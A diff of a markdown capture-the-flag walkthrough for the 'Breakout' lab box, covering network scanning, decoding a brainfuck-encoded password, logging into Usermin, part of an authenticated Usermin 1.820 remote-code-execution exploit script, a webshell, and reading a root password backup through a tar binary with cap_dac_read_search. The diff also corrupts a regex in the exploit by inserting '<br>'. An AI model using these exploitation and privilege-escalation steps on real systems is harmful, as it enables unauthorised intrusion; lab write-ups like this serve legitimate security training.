@@ -7,7 +7,7 @@ This box was created to be an Easy box, but it can be Medium if you get lost.
 
 For hints discord Server ( https://discord.gg/7asvAhCEhe )
 ```
-\
+<br>
 
 # Exploitation
 Let's start with a network scan
@@ -22,7 +22,7 @@ Let's start with a network scan
  192.168.0.100   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
  192.168.0.112   08:00:27:b7:db:52      1      60  PCS Systemtechnik GmbH
 ```
-\
+<br>
 Next, Open Ports
 ```bash
 PORT      STATE SERVICE          REASON
@@ -33,15 +33,15 @@ PORT      STATE SERVICE          REASON
 20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
 
 ```
-\
+<br>
 Accessing port 80
-\
+<br>
 <img width="1423" height="481" alt="image" src="https://github.com/user-attachments/assets/d9234d42-8e63-4442-bb87-3357b6b4b375" />
-\
+<br>
 When i checked its source content and scrolled down
-\
+<br>
 <img width="1698" height="696" alt="image" src="https://github.com/user-attachments/assets/d80594e2-f864-48c3-8b6b-f5a60f418d8e" />
-\
+<br>
 ```bash
 <!--
 don't worry no one will get here, it's safe to share with you my access. Its encrypted :)
@@ -52,17 +52,17 @@ don't worry no one will get here, it's safe to share with you my access. Its enc
 -->
 ```
 
-\
+<br>
 This is basically brainfuck language, and we can just use compilers online
-\
+<br>
 
 <img width="984" height="292" alt="image" src="https://github.com/user-attachments/assets/6a4b6178-9909-4489-a752-52c05a7e4c91" />
-\
+<br>
 So, we have a password but not a username, so I run it and get:<br>
-"Unix User\\cyber (Local User)"<br>
+"Unix User<br><br>cyber (Local User)"<br>
 Now, I try to log in to the service on port 20000 with the credentials.
 <img width="229" height="766" alt="image" src="https://github.com/user-attachments/assets/ac6994fc-2813-42cb-8bdc-c97f946cb806" />
-\
+<br>
 We see the version of usermin , so i check searchsploit
 ```bash
 searchsploit usermin 1.8
@@ -74,7 +74,7 @@ Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                    
 Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                                                     | multiple/remote/2017.pl
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -------------------------
 ```
-\
+<br>
 This is the exploit
 ```bash
 # Title: Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
@@ -158,7 +158,7 @@ def exploit(args):
             
             session.headers.update({'referer': target})
             key_list = session.post(target+"/gnupg/list_keys.cgi", verify=False)
-            last_gets_key = re.findall("edit_key.cgi\?(.*?)'",str(key_list.content))[-2]
+            last_gets_key = re.findall("edit_key.cgi<br>?(.*?)'",str(key_list.content))[-2]
             print("[+] Key : {}".format(last_gets_key))
 
             session.headers.update({'referer': target})
@@ -180,45 +180,45 @@ def exploit(args):
 if __name__ == "__main__":
     init()
 ```
-\
+<br>
 This exploit basically uses a GnuPG vuln to execute code
-\
+<br>
 We have to change the     listen_ip = "0.0.0.0"     listen_ip = "0.0.0.0"  listen_port = 1337 under the exploit function in the script
-\
+<br>
 I tried it , but then i couldnt get it to work , i tried to manually do the exploit , still failed
-\
+<br>
 So i checked the dashhboard and i saw a file manager
-\
+<br>
 <img width="1726" height="736" alt="image" src="https://github.com/user-attachments/assets/ab815788-7e47-40e7-ab99-88ef38e605e5" />
-\
+<br>
 So i thought i can access files , so lets upload a reverse shell and access it , but then i noticed a small terminal symbol on the bottom left
-\
+<br>
 <img width="232" height="29" alt="image" src="https://github.com/user-attachments/assets/1ef349dd-7608-4dea-a806-17332a242a5c" />
-\
+<br>
 When i clicked it , it gave me a webshell as user "cyber"
-\
+<br>
 <img width="1715" height="366" alt="image" src="https://github.com/user-attachments/assets/eb2f2311-0f76-4d9f-901e-36c775ec5a4c" />
-\
+<br>
 So easy
 ```bash
 [cyber@breakout ~]$ cat user.txt
 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
 ```
-\
+<br>
 Then i checked SUID and Capabilities files
 ```bash
 [cyber@breakout tmp]$ getcap -r / 2>/dev/null
 /home/cyber/tar cap_dac_read_search=ep
 /usr/bin/ping cap_net_raw=ep
 ```
-\
+<br>
 And i saw that a file without our domain has capabiities
 ```bash
 "CAP_DAC_READ_SEARCH", the description of which reads:  "Bypass file read permission checks and directory read and execute permission checks"
 ```
-\
+<br>
 So we can just make a tar archive of that file and then extract it to read it
-\
+<br>
 then i used linpeas and it found a backup file
 ```bash
 cyber@breakout tmp]$ cd /var/backups
@@ -234,7 +234,7 @@ drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
 -rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
 -rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
 ```
-\
+<br>
 So Lets read this file using the tar at /home/cyber
 ```bash
 [cyber@breakout backups]$ /home/cyber/tar -cf /tmp/old_pass.tar /var/backups/.old_pass.bak
@@ -247,7 +247,7 @@ var/backups/.old_pass.bak
 Ts&4&YurgtRX(=~h
 [cyber@breakout tmp]$
 ```
-\
+<br>
 I tried changing my user to root in webshell , but it was not happening , so i had to get a local shell and change
 ```bash
 cyber@breakout:/tmp$ su root
@@ -270,5 +270,5 @@ root@breakout:~# cat rOOt.txt
 
 Author: Icex64 & Empire Cybersecurity
 ```
-\
+<br>
 The End , Thank You for reading till here
